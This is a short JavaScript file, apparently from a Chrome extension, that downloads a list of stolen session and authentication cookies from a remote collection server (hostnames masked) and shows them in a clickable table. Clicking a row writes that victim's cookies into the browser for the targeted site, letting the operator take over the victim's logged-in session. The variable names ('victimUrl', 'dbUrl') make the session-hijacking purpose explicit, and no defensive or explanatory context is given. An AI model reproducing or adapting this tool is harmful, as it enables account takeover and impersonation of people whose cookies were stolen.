var cookies = [];
var sesid = "***";
var auth = "***";
var victimUrl = "http://***.net";
var dbUrl = "http://****.esy.es/get.php";

function click(id) {
    //alert(JSON.stringify(cookies[id]));
    chrome.cookies.set({"name":auth,"url":victimUrl,"value":cookies[id][auth]});
    chrome.cookies.set({"name":sesid,"url":victimUrl,"value":cookies[id][sesid]});
    alert("listo")
}

$.getJSON(dbUrl, function(data) {
    cookies = data;
    var table = $('<table border="1"></table>');
    var header = $('<tr style="font-weight:bold;"></tr>');
    var hd1 = $('<td></td>').text(sesid);
    var hd2 = $('<td></td>').text(auth);
    header.append(hd1);
    header.append(hd2);
    table.append(header);
    
    $(data).each(function(i) {
        var row = $('<tr></tr>').click(function(){click(i);});
        var td1 = $('<td></td>').text(this[sesid]);
        var td2 = $('<td></td>').text(this[auth]);
        row.append(td1);
        row.append(td2);
        table.append(row);
    });
    
    $("body").append(table);
});
